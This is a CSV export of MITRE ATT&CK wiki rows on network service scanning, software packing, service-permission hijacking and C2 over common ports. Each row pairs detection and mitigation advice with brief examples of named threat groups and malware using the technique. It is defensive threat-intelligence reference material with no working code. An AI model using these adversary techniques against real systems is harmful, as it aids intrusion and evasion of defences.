725,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']","[""[[Group/G0039|Suckfly]] the victim's internal network for hosts with ports 8080, 5900, and 40 open.[[CiteRef::Symantec Suckfly May 2016]]""]",['Suckfly'],['Suckfly'],['G0039'],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1046'],['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
726,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']",['[[Software/S0154|Cobalt Strike]] can perform port scans from an infected host.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],Software: Cobalt Strike,['Discovery'],['Technique/T1046'],['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
727,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']","[""[[Group/G0037|FIN6]] used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[[CiteRef::FireEye FIN6 April 2016]]""]",['FIN6'],['FIN6'],['G0037'],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1046'],['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
728,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']","['[[Group/G0045|menuPass]] has used tcping.exe, similar to [[Software/S0097|Ping]], to probe port status on systems of interest.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1046'],['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
729,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']",['[[Group/G0027|Threat Group-3390]] actors use the Hunter tool to conduct network service discovery for vulnerable systems.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1046'],['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
730,"['Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.']","['Anti-virus', 'heuristic detection', 'Signature-based detection']",['570'],[],['Binary file metadata'],['[[Group/G0043|Group5]] packed an executable by base64 encoding the PE file and breaking it up into numerous lines.[[CiteRef::Citizen Lab Group5]]'],['Group5'],['Group5'],['G0043'],['Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.\n\nIdentify and prevent execution of potentially malicious software that may have been packed by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1045'],['Software Packing'],https://attack.mitre.org/wiki/Technique/T1045
731,"['Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.']","['Anti-virus', 'heuristic detection', 'Signature-based detection']",['570'],[],['Binary file metadata'],['[[Software/S0022|Uroburos]] uses a custom packer.[[CiteRef::Symantec Waterbug]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],['Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.\n\nIdentify and prevent execution of potentially malicious software that may have been packed by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: Uroburos,['Defense Evasion'],['Technique/T1045'],['Software Packing'],https://attack.mitre.org/wiki/Technique/T1045
732,"['Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.']","['Anti-virus', 'heuristic detection', 'Signature-based detection']",['570'],[],['Binary file metadata'],['[[Group/G0014|Night Dragon]] is known to use software packing in its tools.[[CiteRef::McAfee Night Dragon]]'],['Night Dragon'],['Night Dragon'],['G0014'],['Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.\n\nIdentify and prevent execution of potentially malicious software that may have been packed by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1045'],['Software Packing'],https://attack.mitre.org/wiki/Technique/T1045
733,"['Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.']","['Anti-virus', 'heuristic detection', 'Signature-based detection']",['570'],[],['Binary file metadata'],['[[Software/S0094|Trojan.Karagany]] samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],['Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.\n\nIdentify and prevent execution of potentially malicious software that may have been packed by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: Trojan.Karagany,['Defense Evasion'],['Technique/T1045'],['Software Packing'],https://attack.mitre.org/wiki/Technique/T1045
734,"['Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.']","['Anti-virus', 'heuristic detection', 'Signature-based detection']",['570'],[],['Binary file metadata'],['[[Software/S0053|SeaDuke]] has been packed with the UPX packer.[[CiteRef::Unit 42 SeaDuke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.\n\nIdentify and prevent execution of potentially malicious software that may have been packed by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Defense Evasion'],['Technique/T1045'],['Software Packing'],https://attack.mitre.org/wiki/Technique/T1045
735,"['Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.']","['Anti-virus', 'heuristic detection', 'Signature-based detection']",['570'],[],['Binary file metadata'],['[[Group/G0016|APT29]] used UPX to pack files.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.\n\nIdentify and prevent execution of potentially malicious software that may have been packed by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1045'],['Software Packing'],https://attack.mitre.org/wiki/Technique/T1045
736,"['Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.']","['Anti-virus', 'heuristic detection', 'Signature-based detection']",['570'],[],['Binary file metadata'],['A [[Group/G0040|Patchwork]] payload was packed with UPX.[[CiteRef::Securelist Dropping Elephant]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],['Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.\n\nIdentify and prevent execution of potentially malicious software that may have been packed by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1045'],['Software Packing'],https://attack.mitre.org/wiki/Technique/T1045
737,"['Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to [[Discovery]] or other adversary techniques.']",[],['17'],['Stefan Kanthak'],"['File monitoring', 'Process command-line parameters', 'Services']","[""One variant of [[Software/S0089|BlackEnergy]] locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.[[CiteRef::F-Secure BlackEnergy 2014]]""]",['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses.[[CiteRef::Powersploit]]\n\nIdentify and block potentially malicious software that may be executed through abuse of file, directory, and service permissions by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown programs. Deny execution from user directories such as file download directories and temp directories where able.[[CiteRef::Seclists Kanthak 7zip Installer]]\n\nTurn off UAC\'s privilege elevation for standard users and installer detection for all users by modifying registry key\n<code>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]</code>to automatically deny elevation requests, add: <code>""ConsentPromptBehaviorUser""=dword:00000000</code>; to disable installer detection, add: <code>""EnableInstallerDetection""=dword:00000000</code>.[[CiteRef::Seclists Kanthak 7zip Installer]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: BlackEnergy, Black Energy","['Persistence', 'Privilege Escalation']",['Technique/T1044'],['File System Permissions Weakness'],https://attack.mitre.org/wiki/Technique/T1044
738,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0080|Mivast]] communicates over port 80 for C2.[[CiteRef::Symantec Backdoor.Mivast]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Mivast,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
739,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0021|Derusbi]] beacons to destination port 443.[[CiteRef::Fidelis Turbo]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Derusbi,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
740,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['One [[Software/S0070|HTTPBrowser]] variant connected to its C2 server over port 8080.[[CiteRef::ZScaler Hacking Team]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
741,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0021|Derusbi]] beacons to destination port 443.[[CiteRef::Fidelis Turbo]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Derusbi,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
742,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0003|RIPTIDE]] is a RAT that communicates with HTTP.[[CiteRef::Moran 2014]]'],['APT12'],"['APT12', 'IXESHE', 'DynCalc', 'Numbered Panda']",['G0005'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: RIPTIDE,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
743,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0013|PlugX]] has beaconed to its C2 over port 443.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['DragonOK'],['DragonOK'],['G0017'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
744,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0095|FTP]] operates over ports 21 and 20.[[CiteRef::Wikipedia FTP]]'],['Naikon'],['Naikon'],['G0019'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: FTP, ftp.exe",['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
745,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0042|LOWBALL]] command and control occurs via HTTPS over port 443.[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: LOWBALL,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
